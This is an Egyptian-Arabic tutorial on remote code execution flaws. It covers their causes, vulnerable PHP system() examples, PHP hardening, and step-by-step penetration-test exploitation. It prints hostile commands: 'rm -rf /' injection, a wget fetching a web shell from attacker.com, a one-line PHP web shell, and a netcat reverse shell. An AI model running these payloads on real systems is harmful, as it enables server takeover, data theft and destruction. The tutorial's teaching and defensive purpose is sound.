

# **📌 1️⃣ يعني إيه تنفيذ أوامر عن بُعد (RCE)؟**

ثغرة **RCE (Remote Code Execution)** هي أخطر نوع من الثغرات، لأنها بتسمح لأي حد إنه **يشغل أوامر برمجية على السيرفر عن بعد**، كأنه قاعد عليه!

**بمعنى تاني:**  
لو موقع أو سيرفر فيه ثغرة **RCE**، المهاجم يقدر يبعث له كود برمجي أو أمر **ويجبره على تنفيذه**. الأمر ده ممكن يكون أي حاجة زي:  
✅ سرقة بيانات من السيرفر.  
✅ إنشاء حسابات جديدة بصلاحيات **أدمن**.  
✅ تحميل ملفات خبيثة زي **Shell** للتحكم الكامل في الموقع.  
✅ حذف بيانات أو حتى **مسح السيرفر بالكامل**.

**🔍 مثال بسيط:**  
تخيل إنك عندك **كمبيوتر** وعامل برنامج يسمح للناس يبعتوا أوامر تشغّلها، بس المشكلة إنك **مش بتتأكد من الأوامر دي آمنة ولا لا**. أي حد يقدر يبعت له أمر زي:

```bash
rm -rf /
```

وده **يمسح كل الملفات** على الجهاز! 😵

## **💡 الخلاصة بالعامية:**  
**ثغرة RCE بتخلي الهاكر يبعت كود للموقع، والموقع ينفذه كأنه الأدمن! 😈🔥**

---

# **🛑 2️⃣ إزاي بتحصل ثغرات RCE؟**

ثغرة **RCE** بتحصل لما السيرفر **يسمح للمستخدمين يبعتوا كود أو أوامر من غير تأمين**. أشهر الأسباب اللي بتسببها:

## **🔹 1. عدم فلترة المدخلات (User Input Validation)**

✅ **مثال:**  
لو عندك موقع بياخد اسم المستخدم وينفذ عليه أمر زي ده:

```php
system("echo Hello, " . $_GET['name']);
```

لو المستخدم كتب كود خبيث بدل اسمه:

```bash
; rm -rf /
```

السيرفر هينفذ الأمر **ويحذف كل حاجة عليه**! 😱

---

# **🔹 2. استغلال ثغرات في تطبيقات الويب**

بعض أنظمة إدارة المحتوى زي **WordPress, Joomla, Drupal** بيكون فيها ثغرات RCE بتسمح برفع ملفات خبيثة زي **Web Shell**، والمهاجم بيتحكم في السيرفر كله!

---

# **🔹 3. ثغرات في دوال تنفيذ الأوامر**

بعض لغات البرمجة زي **PHP, Python, Node.js** بتحتوي على دوال تسمح بتنفيذ الأوامر مباشرة، زي:  
#### ✅ **في PHP:**

```php
system(), exec(), shell_exec(), passthru()
```

#### ✅ **في Python:**

```python
os.system(), subprocess.Popen()
```

#### ✅ **في Node.js:**

```js
child_process.exec()
```

لو المطور استخدم الدوال دي من غير تأمين، أي حد ممكن يستغلها.

## **💡 الخلاصة بالعامية:**  
ثغرات **RCE** بتحصل لما الموقع يسمح بتشغيل أكواد أو أوامر بدون حماية، زي دوال خطيرة أو سكريبتات مفتوحة للهاكرز! 😈🔥

---

# **🎯 3️⃣ أمثلة عملية لاستغلال RCE**

## **📌 1. تنفيذ أوامر من خلال Ping Test**

بعض المواقع بتسمحلك تدخل **IP** عشان تعمل Ping، ولو ما كانش فيه حماية كويسة، ممكن تكتب كود خبيث بدل الـ IP!

✅ **مثال على موقع عنده ثغرة RCE:**  
الكود التالي بينفذ أمر Ping على عنوان IP يدخله المستخدم:

```php
system("ping -c 4 " . $_GET['ip']);
```

لو دخلت كود زي ده:

```bash
127.0.0.1; whoami
```

السيرفر هينفذ الأمر **whoami** وهيطبع اسم المستخدم اللي شغال بيه السيرفر! 😈

---

## **📌 2. رفع Web Shell**

لو عندك RCE، ممكن تبعت أمر يرفع **Shell** زي `pentest.php`، وتتحكم في السيرفر بالكامل!  
✅ **مثال:**

```bash
wget http://attacker.com/shell.php -O /var/www/html/shell.php
```

بعد كده تفتح `http://victim.com/shell.php` وتبدأ تتحكم في السيرفر!

**💡 الخلاصة بالعامية:**  
✅ **RCE بتسمحلك تنفذ أوامر على السيرفر زي `whoami` و `ls` وتشوف كل حاجة فيه**.  
✅ **لو استغليتها صح، تقدر ترفع Shell وتتحكم في الموقع بالكامل! 😈🔥**

---

# **⚠️ 4️⃣ إزاي تحمي نفسك من ثغرات RCE؟**

✅ **فلترة المدخلات (Input Validation)**  
⛔ **ما تاخدش أي بيانات من المستخدم وتنفذها مباشرة**.

✅ **استخدام قيود على تنفيذ الأوامر (Sandboxing)**  
⛔ **ما تديش صلاحيات تنفيذ أوامر من السكريبت**.

✅ **تعطيل الدوال الخطيرة في PHP**  
📌 في ملف `php.ini` عطل الدوال الخطيرة:

```ini
disable_functions = system, exec, shell_exec, passthru, popen, proc_open
```

✅ **تحديث التطبيقات أول بأول**  
📌 سد الثغرات في **WordPress, Joomla, Drupal** والتأكد إن كل حاجة محدثة.

**💡 الخلاصة بالعامية:**  
**اقفل الدوال الخطيرة، فلتر المدخلات، ما تشغلش أكواد من المستخدم، وحدّث التطبيقات باستمرار**.

---

# **🔥 5️⃣ خطوات عملية لاستخدام RCE في اختبار الاختراق**

## **✅ 1. استكشاف الثغرة**

🔹 جرب تدخل **أوامر بسيطة** في أي مدخل مستخدم:

```bash
whoami
ls
uname -a
id
```

لو السيرفر رجعلك بيانات، يبقى عندك RCE! 😈

---

## **✅ 2. تأكيد استغلال الثغرة**

🔹 جرب تشغل أمر أطول:

```bash
ping -c 4 attacker.com
```

لو استلمت الـ Ping على جهازك، يبقى الثغرة شغالة تمام.

---

## **✅ 3. رفع Web Shell**

🔹 ارفع ملف PHP Shell بسيط زي ده:

```php
<?php echo shell_exec($_GET['cmd']); ?>
```

واحفظه كـ `shell.php`، بعدين شغله كده:

```bash
http://victim.com/shell.php?cmd=whoami
```

ده هينفذ الأمر اللي تبعته في السيرفر! 😈🔥

---

## **✅ 4. التحكم الكامل في السيرفر**

🔹 بعد ما ترفع الشيل، تقدر تعمل أي حاجة:  
✅ تشغيل **Netcat Reverse Shell**

```bash
nc -e /bin/sh attacker.com 4444
```

✅ سرقة ملفات **config.php** عشان تجيب بيانات قاعدة البيانات.  
✅ رفع **ملفات خبيثة** والتجسس على السيرفر.

---

# **🚀 الخلاصة النهائية**

🎯 **ثغرة RCE = المهاجم يقدر يبعت أكواد وأوامر وينفذها على السيرفر عن بعد**.  
🎯 **سببها الرئيسي = عدم تأمين المدخلات، واستخدام دوال خطيرة زي `system()` و `exec()`**.  
🎯 **ممكن يستخدمها المهاجم في سرقة البيانات، رفع شيل، أو حتى تدمير السيرفر بالكامل**.  
🎯 **الحماية منها = فلترة المدخلات، تعطيل الدوال الخطيرة، وعدم تشغيل أوامر من المستخدم مباشرة**.

🚀 كده عندك فهم عميق لثغرة **RCE** وكيفية استخدامها واختبارها بطريقة سهلة ومبسطة! 😎🔥